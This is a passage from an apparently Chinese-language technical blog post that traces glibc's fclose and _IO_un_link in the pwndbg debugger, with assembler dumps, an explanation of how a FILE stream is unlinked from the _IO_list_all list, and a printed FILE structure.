&lt;+299&gt;:   jmp    0x7ffff7c7ec9d &lt;_IO_new_fclose+45&gt;</span><br><span class="line">   0x00007ffff7c7eda0 &lt;+304&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c7eda8 &lt;+312&gt;:   xchg   DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c7edaa &lt;+314&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c7edad &lt;+317&gt;:   jle    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7edb3 &lt;+323&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7edb8 &lt;+328&gt;:   jmp    0x7ffff7c7ecb2 &lt;_IO_new_fclose+66&gt;</span><br><span class="line">   0x00007ffff7c7edbd &lt;+333&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c7edc0 &lt;+336&gt;:   mov    rbx,QWORD PTR [rbp+0x98]</span><br><span class="line">   0x00007ffff7c7edc7 &lt;+343&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7edc9 &lt;+345&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c7edce &lt;+350&gt;:   lock cmpxchg DWORD PTR [rip+0x19cc5a],edx        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7edd6 &lt;+358&gt;:   jne    0x7ffff7c7ee20 &lt;_IO_new_fclose+432&gt;</span><br><span class="line">   0x00007ffff7c7edd8 &lt;+360&gt;:   mov    rdi,QWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c7eddb &lt;+363&gt;:   call   0x7ffff7c2b990 &lt;__gconv_release_step&gt;</span><br><span class="line">   0x00007ffff7c7ede0 &lt;+368&gt;:   mov    rdi,QWORD PTR [rbx+0x38]</span><br><span class="line">   0x00007ffff7c7ede4 &lt;+372&gt;:   call   0x7ffff7c2b990 &lt;__gconv_release_step&gt;</span><br><span class="line">   0x00007ffff7c7ede9 &lt;+377&gt;:   xor    eax,eax</span><br><span class="line">   0x00007ffff7c7edeb &lt;+379&gt;:   xchg   DWORD PTR [rip+0x19cc3f],eax        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7edf1 &lt;+385&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c7edf4 &lt;+388&gt;:   jle    0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7edfa &lt;+394&gt;:   lea    rdi,[rip+0x19cc2f]        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7ee01 &lt;+401&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c7ee06 &lt;+406&gt;:   jmp    0x7ffff7c7ecfe &lt;_IO_new_fclose+142&gt;</span><br><span class="line">   0x00007ffff7c7ee0b &lt;+411&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7ee10 &lt;+416&gt;:   call   0x7ffff7c89ef0 &lt;_IO_vtable_check&gt;</span><br><span class="line">   0x00007ffff7c7ee15 &lt;+421&gt;:   jmp    0x7ffff7c7ecd9 &lt;_IO_new_fclose+105&gt;</span><br><span class="line">   0x00007ffff7c7ee1a &lt;+426&gt;:   nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7ee20 &lt;+432&gt;:   lea    rdi,[rip+0x19cc09]        # 0x7ffff7e1ba30 &lt;__gconv_lock&gt;</span><br><span class="line">   0x00007ffff7c7ee27 &lt;+439&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7ee2c &lt;+444&gt;:   jmp    0x7ffff7c7edd8 &lt;_IO_new_fclose+360&gt;</span><br><span class="line">   0x00007ffff7c7ee2e &lt;+446&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c7ee30 &lt;+448&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c7ee35 &lt;+453&gt;:   jmp    0x7ffff7c7ed64 &lt;_IO_new_fclose+244&gt;</span><br><span class="line">   0x00007ffff7c7ee3a &lt;+458&gt;:   endbr64</span><br><span class="line">   0x00007ffff7c7ee3e &lt;+462&gt;:   mov    r12,rax</span><br><span class="line">   0x00007ffff7c7ee41 &lt;+465&gt;:   jmp    0x7ffff7c28fff &lt;_IO_new_fclose.cold&gt;</span><br><span class="line">Address range 0x7ffff7c28fff to 0x7ffff7c29036:</span><br><span class="line">   0x00007ffff7c28fff &lt;-351345&gt;:        test   DWORD PTR [rbp+0x0],0x8000</span><br><span class="line">   0x00007ffff7c29006 &lt;-351338&gt;:        jne    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c29008 &lt;-351336&gt;:        mov    rdi,QWORD PTR [rbp+0x88]</span><br><span class="line">   0x00007ffff7c2900f &lt;-351329&gt;:        mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c29012 &lt;-351326&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29015 &lt;-351323&gt;:        mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c29018 &lt;-351320&gt;:        jne    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c2901a &lt;-351318&gt;:        mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c29022 &lt;-351310&gt;:        xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c29024 &lt;-351308&gt;:        sub    eax,0x1</span><br><span class="line">   0x00007ffff7c29027 &lt;-351305&gt;:        jle    0x7ffff7c2902e &lt;_IO_new_fclose-351298&gt;</span><br><span class="line">   0x00007ffff7c29029 &lt;-351303&gt;:        call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c2902e &lt;-351298&gt;:        mov    rdi,r12</span><br><span class="line">   0x00007ffff7c29031 &lt;-351295&gt;:        call   0x7ffff7c2a120 &lt;_Unwind_Resume&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><code>_IO_new_fclose</code>函数，往下走<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7ec74 &lt;fclose+4&gt;      push   r12</span><br><span class="line">0x7ffff7c7ec76 &lt;fclose+6&gt;      push   rbp</span><br><span class="line">0x7ffff7c7ec77 &lt;fclose+7&gt;      mov    rbp, rdi                 RBP =&gt; 0x5555555592a0 ◂— 0xfbad2c84</span><br><span class="line">0x7ffff7c7ec7a &lt;fclose+10&gt;     push   rbx</span><br><span class="line">0x7ffff7c7ec7b &lt;fclose+11&gt;     mov    eax, dword ptr [rdi]     EAX, [0x5555555592a0] =&gt; 0xfbad2c84</span><br><span class="line">0x7ffff7c7ec7d &lt;fclose+13&gt;     test   ah, 0x20                 0x2c &amp; 0x20     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c7ec80 &lt;fclose+16&gt;   ✔ jne    fclose+192                  &lt;fclose+192&gt;</span><br><span class="line">    ↓</span><br><span class="line">0x7ffff7c7ed30 &lt;fclose+192&gt;    call   _IO_un_link                 &lt;_IO_un_link&gt;</span><br></pre></td></tr></table></figure><p><code>test ah, 0x20</code>：检测<code>_flags</code>相应位，判断文件流是否需要链表管理（<code>_IO_IS_FILEBUF</code> 标志），满足条件调用<code>_IO_un_link</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function __GI__IO_un_link:</span><br><span class="line">=&gt; 0x00007ffff7c8d070 &lt;+0&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c8d072 &lt;+2&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c8d074 &lt;+4&gt;:     lea    r12,[rip+0x18f9d5]        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d07b &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c8d07c &lt;+12&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c8d07d &lt;+13&gt;:    mov    rbx,rdi</span><br><span class="line">   0x00007ffff7c8d080 &lt;+16&gt;:    sub    rsp,0x38</span><br><span class="line">   0x00007ffff7c8d084 &lt;+20&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00007ffff7c8d08d &lt;+29&gt;:    mov    QWORD PTR [rsp+0x28],rax</span><br><span class="line">   0x00007ffff7c8d092 &lt;+34&gt;:    xor    eax,eax</span><br><span class="line">   0x00007ffff7c8d094 &lt;+36&gt;:    mov    rbp,rsp</span><br><span class="line">   0x00007ffff7c8d097 &lt;+39&gt;:    lea    rax,[rip+0xffffffffffffff42]        # 0x7ffff7c8cfe0 &lt;flush_cleanup&gt;</span><br><span class="line">   0x00007ffff7c8d09e &lt;+46&gt;:    mov    QWORD PTR [rsp+0x8],0x0</span><br><span class="line">   0x00007ffff7c8d0a7 &lt;+55&gt;:    mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8d0aa &lt;+58&gt;:    mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7c8d0ae &lt;+62&gt;:    call   0x7ffff7c911c0 &lt;__GI___libc_cleanup_push_defer&gt;</span><br><span class="line">   0x00007ffff7c8d0b3 &lt;+67&gt;:    mov    r13,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8d0bc &lt;+76&gt;:    cmp    r13,QWORD PTR [rip+0x18f995]        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d0c3 &lt;+83&gt;:    je     0x7ffff7c8d0e1 &lt;__GI__IO_un_link+113&gt;</span><br><span class="line">   0x00007ffff7c8d0c5 &lt;+85&gt;:    xor    eax,eax</span><br><span class="line">   0x00007ffff7c8d0c7 &lt;+87&gt;:    mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8d0cc &lt;+92&gt;:    lock cmpxchg DWORD PTR [rip+0x18f97c],edx        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d0d4 &lt;+100&gt;:   jne    0x7ffff7c8d270 &lt;__GI__IO_un_link+512&gt;</span><br><span class="line">   0x00007ffff7c8d0da &lt;+106&gt;:   mov    QWORD PTR [rip+0x18f977],r13        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d0e1 &lt;+113&gt;:   mov    edx,DWORD PTR [rip+0x18f96d]        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d0e7 &lt;+119&gt;:   mov    esi,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8d0e9 &lt;+121&gt;:   mov    QWORD PTR [rip+0x18f950],rbx        # 0x7ffff7e1ca40 &lt;run_fp&gt;</span><br><span class="line">   0x00007ffff7c8d0f0 &lt;+128&gt;:   lea    eax,[rdx+0x1]</span><br><span class="line">   0x00007ffff7c8d0f3 &lt;+131&gt;:   mov    DWORD PTR [rip+0x18f95b],eax        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d0f9 &lt;+137&gt;:   mov    eax,esi</span><br><span class="line">   0x00007ffff7c8d0fb &lt;+139&gt;:   and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8d100 &lt;+144&gt;:   jne    0x7ffff7c8d1f8 &lt;__GI__IO_un_link+392&gt;</span><br><span class="line">   0x00007ffff7c8d106 &lt;+150&gt;:   mov    r13,QWORD PTR fs:0x10</span><br><span class="line">   0x00007ffff7c8d10f &lt;+159&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d116 &lt;+166&gt;:   cmp    r13,QWORD PTR [rdi+0x8]</span><br><span class="line">   0x00007ffff7c8d11a &lt;+170&gt;:   je     0x7ffff7c8d230 &lt;__GI__IO_un_link+448&gt;</span><br><span class="line">   0x00007ffff7c8d120 &lt;+176&gt;:   mov    edx,0x1</span><br><span class="line">   0x00007ffff7c8d125 &lt;+181&gt;:   lock cmpxchg DWORD PTR [rdi],edx</span><br><span class="line">   0x00007ffff7c8d129 &lt;+185&gt;:   jne    0x7ffff7c8d297 &lt;__GI__IO_un_link+551&gt;</span><br><span class="line">   0x00007ffff7c8d12f &lt;+191&gt;:   mov    esi,DWORD PTR [rbx]</span><br><span class="line">   0x00007ffff7c8d131 &lt;+193&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d138 &lt;+200&gt;:   mov    rcx,QWORD PTR [rip+0x18e541]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d13f &lt;+207&gt;:   mov    eax,esi</span><br><span class="line">   0x00007ffff7c8d141 &lt;+209&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8d145 &lt;+213&gt;:   mov    QWORD PTR [rdi+0x8],r13</span><br><span class="line">   0x00007ffff7c8d149 &lt;+217&gt;:   and    eax,0x8000</span><br><span class="line">   0x00007ffff7c8d14e &lt;+222&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d151 &lt;+225&gt;:   je     0x7ffff7c8d167 &lt;__GI__IO_un_link+247&gt;</span><br><span class="line">   0x00007ffff7c8d153 &lt;+227&gt;:   mov    rdx,QWORD PTR [rcx+0x68]</span><br><span class="line">   0x00007ffff7c8d157 &lt;+231&gt;:   cmp    rbx,rcx</span><br><span class="line">   0x00007ffff7c8d15a &lt;+234&gt;:   jne    0x7ffff7c8d21c &lt;__GI__IO_un_link+428&gt;</span><br><span class="line">   0x00007ffff7c8d160 &lt;+240&gt;:   mov    QWORD PTR [rip+0x18e519],rdx        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d167 &lt;+247&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d16b &lt;+251&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d16d &lt;+253&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8d16f &lt;+255&gt;:   jne    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d171 &lt;+257&gt;:   mov    rdi,QWORD PTR [rbx+0x88]</span><br><span class="line">   0x00007ffff7c8d178 &lt;+264&gt;:   mov    eax,DWORD PTR [rdi+0x4]</span><br><span class="line">   0x00007ffff7c8d17b &lt;+267&gt;:   sub    eax,0x1</span><br><span class="line">   0x00007ffff7c8d17e &lt;+270&gt;:   mov    DWORD PTR [rdi+0x4],eax</span><br><span class="line">   0x00007ffff7c8d181 &lt;+273&gt;:   jne    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d183 &lt;+275&gt;:   mov    QWORD PTR [rdi+0x8],0x0</span><br><span class="line">   0x00007ffff7c8d18b &lt;+283&gt;:   xchg   DWORD PTR [rdi],eax</span><br><span class="line">   0x00007ffff7c8d18d &lt;+285&gt;:   cmp    eax,0x1</span><br><span class="line">   0x00007ffff7c8d190 &lt;+288&gt;:   jg     0x7ffff7c8d28d &lt;__GI__IO_un_link+541&gt;</span><br><span class="line">   0x00007ffff7c8d196 &lt;+294&gt;:   mov    eax,DWORD PTR [rip+0x18f8b8]        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d19c &lt;+300&gt;:   lea    edx,[rax-0x1]</span><br><span class="line">   0x00007ffff7c8d19f &lt;+303&gt;:   mov    QWORD PTR [rip+0x18f896],0x0        # 0x7ffff7e1ca40 &lt;run_fp&gt;</span><br><span class="line">   0x00007ffff7c8d1aa &lt;+314&gt;:   mov    DWORD PTR [rip+0x18f8a4],edx        # 0x7ffff7e1ca54 &lt;list_all_lock+4&gt;</span><br><span class="line">   0x00007ffff7c8d1b0 &lt;+320&gt;:   test   edx,edx</span><br><span class="line">   0x00007ffff7c8d1b2 &lt;+322&gt;:   jne    0x7ffff7c8d1ce &lt;__GI__IO_un_link+350&gt;</span><br><span class="line">   0x00007ffff7c8d1b4 &lt;+324&gt;:   mov    QWORD PTR [rip+0x18f899],0x0        # 0x7ffff7e1ca58 &lt;list_all_lock+8&gt;</span><br><span class="line">   0x00007ffff7c8d1bf &lt;+335&gt;:   xchg   DWORD PTR [rip+0x18f88b],edx        # 0x7ffff7e1ca50 &lt;list_all_lock&gt;</span><br><span class="line">   0x00007ffff7c8d1c5 &lt;+341&gt;:   cmp    edx,0x1</span><br><span class="line">   0x00007ffff7c8d1c8 &lt;+344&gt;:   jg     0x7ffff7c8d280 &lt;__GI__IO_un_link+528&gt;</span><br><span class="line">   0x00007ffff7c8d1ce &lt;+350&gt;:   mov    rdi,rbp</span><br><span class="line">   0x00007ffff7c8d1d1 &lt;+353&gt;:   call   0x7ffff7c91200 &lt;__GI___libc_cleanup_pop_restore&gt;</span><br><span class="line">   0x00007ffff7c8d1d6 &lt;+358&gt;:   mov    rax,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x00007ffff7c8d1db &lt;+363&gt;:   sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x00007ffff7c8d1e4 &lt;+372&gt;:   jne    0x7ffff7c8d2a1 &lt;__GI__IO_un_link+561&gt;</span><br><span class="line">   0x00007ffff7c8d1ea &lt;+378&gt;:   add    rsp,0x38</span><br><span class="line">   0x00007ffff7c8d1ee &lt;+382&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c8d1ef &lt;+383&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c8d1f0 &lt;+384&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c8d1f2 &lt;+386&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c8d1f4 &lt;+388&gt;:   ret</span><br><span class="line">   0x00007ffff7c8d1f5 &lt;+389&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8d1f8 &lt;+392&gt;:   mov    rcx,QWORD PTR [rip+0x18e481]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d1ff &lt;+399&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d202 &lt;+402&gt;:   jne    0x7ffff7c8d153 &lt;__GI__IO_un_link+227&gt;</span><br><span class="line">   0x00007ffff7c8d208 &lt;+408&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d20c &lt;+412&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d20e &lt;+414&gt;:   jmp    0x7ffff7c8d19f &lt;__GI__IO_un_link+303&gt;</span><br><span class="line">   0x00007ffff7c8d210 &lt;+416&gt;:   cmp    rbx,rdx</span><br><span class="line">   0x00007ffff7c8d213 &lt;+419&gt;:   je     0x7ffff7c8d250 &lt;__GI__IO_un_link+480&gt;</span><br><span class="line">   0x00007ffff7c8d215 &lt;+421&gt;:   mov    rcx,rdx</span><br><span class="line">   0x00007ffff7c8d218 &lt;+424&gt;:   mov    rdx,QWORD PTR [rdx+0x68]</span><br><span class="line">   0x00007ffff7c8d21c &lt;+428&gt;:   test   rdx,rdx</span><br><span class="line">   0x00007ffff7c8d21f &lt;+431&gt;:   jne    0x7ffff7c8d210 &lt;__GI__IO_un_link+416&gt;</span><br><span class="line">   0x00007ffff7c8d221 &lt;+433&gt;:   jmp    0x7ffff7c8d167 &lt;__GI__IO_un_link+247&gt;</span><br><span class="line">   0x00007ffff7c8d226 &lt;+438&gt;:   cs nop WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c8d230 &lt;+448&gt;:   mov    rcx,QWORD PTR [rip+0x18e449]        # 0x7ffff7e1b680 &lt;_IO_list_all&gt;</span><br><span class="line">   0x00007ffff7c8d237 &lt;+455&gt;:   add    DWORD PTR [rdi+0x4],0x1</span><br><span class="line">   0x00007ffff7c8d23b &lt;+459&gt;:   test   rcx,rcx</span><br><span class="line">   0x00007ffff7c8d23e &lt;+462&gt;:   jne    0x7ffff7c8d153 &lt;__GI__IO_un_link+227&gt;</span><br><span class="line">   0x00007ffff7c8d244 &lt;+468&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d248 &lt;+472&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d24a &lt;+474&gt;:   jmp    0x7ffff7c8d178 &lt;__GI__IO_un_link+264&gt;</span><br><span class="line">   0x00007ffff7c8d24f &lt;+479&gt;:   nop</span><br><span class="line">   0x00007ffff7c8d250 &lt;+480&gt;:   mov    rdx,QWORD PTR [rbx+0x68]</span><br><span class="line">   0x00007ffff7c8d254 &lt;+484&gt;:   and    sil,0x7f</span><br><span class="line">   0x00007ffff7c8d258 &lt;+488&gt;:   add    rcx,0x68</span><br><span class="line">   0x00007ffff7c8d25c &lt;+492&gt;:   mov    QWORD PTR [rcx],rdx</span><br><span class="line">   0x00007ffff7c8d25f &lt;+495&gt;:   mov    DWORD PTR [rbx],esi</span><br><span class="line">   0x00007ffff7c8d261 &lt;+497&gt;:   test   eax,eax</span><br><span class="line">   0x00007ffff7c8d263 &lt;+499&gt;:   je     0x7ffff7c8d171 &lt;__GI__IO_un_link+257&gt;</span><br><span class="line">   0x00007ffff7c8d269 &lt;+505&gt;:   jmp    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d26e &lt;+510&gt;:   xchg   ax,ax</span><br><span class="line">   0x00007ffff7c8d270 &lt;+512&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ffff7c8d273 &lt;+515&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8d278 &lt;+520&gt;:   jmp    0x7ffff7c8d0da &lt;__GI__IO_un_link+106&gt;</span><br><span class="line">   0x00007ffff7c8d27d &lt;+525&gt;:   nop    DWORD PTR [rax]</span><br><span class="line">   0x00007ffff7c8d280 &lt;+528&gt;:   mov    rdi,r12</span><br><span class="line">   0x00007ffff7c8d283 &lt;+531&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8d288 &lt;+536&gt;:   jmp    0x7ffff7c8d1ce &lt;__GI__IO_un_link+350&gt;</span><br><span class="line">   0x00007ffff7c8d28d &lt;+541&gt;:   call   0x7ffff7c91300 &lt;__GI___lll_lock_wake_private&gt;</span><br><span class="line">   0x00007ffff7c8d292 &lt;+546&gt;:   jmp    0x7ffff7c8d196 &lt;__GI__IO_un_link+294&gt;</span><br><span class="line">   0x00007ffff7c8d297 &lt;+551&gt;:   call   0x7ffff7c91230 &lt;__GI___lll_lock_wait_private&gt;</span><br><span class="line">   0x00007ffff7c8d29c &lt;+556&gt;:   jmp    0x7ffff7c8d12f &lt;__GI__IO_un_link+191&gt;</span><br><span class="line">   0x00007ffff7c8d2a1 &lt;+561&gt;:   call   0x7ffff7d36550 &lt;__stack_chk_fail&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>往下走<br>进行了一些有关线程锁的操作，然后再维护<code>_IO_list_all</code>链表：检查标志位是否包含<code>_IO_LINKED</code>标志，该标志的定义是<code>#define _IO_LINKED 0x80</code>，表示该结构体是否被链接到了<code>_IO_list_all</code>链表中。<br>如果没有<code>_IO_LINKED</code>标志（不在<code>_IO_list_all</code>链表中）或者<code>_IO_list_all</code>链表为空，则直接返回。<br>否则的话即表示结构体为<code>_IO_list_all</code>链表中某个节点，所要做的就是将这个节点取下来，接下来就是单链表的删除节点的操作，首先判断是不是<code>_IO_list_all</code>链表头，如果是的话直接将<code>_IO_list_all</code>指向<code>_IO_list_all-&gt;file._chain</code>就好了，如果不是链表头则遍历链表，找到该结构体，再将其取下。<br>最后返回之前设置<code>_flags</code>为<code>~_IO_LINKED</code>表示该结构体不在<code>_IO_list_all</code>链表中.我们看现在<code>_IO_list_all</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72540026,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">    _fileno = 2,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = -1,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = 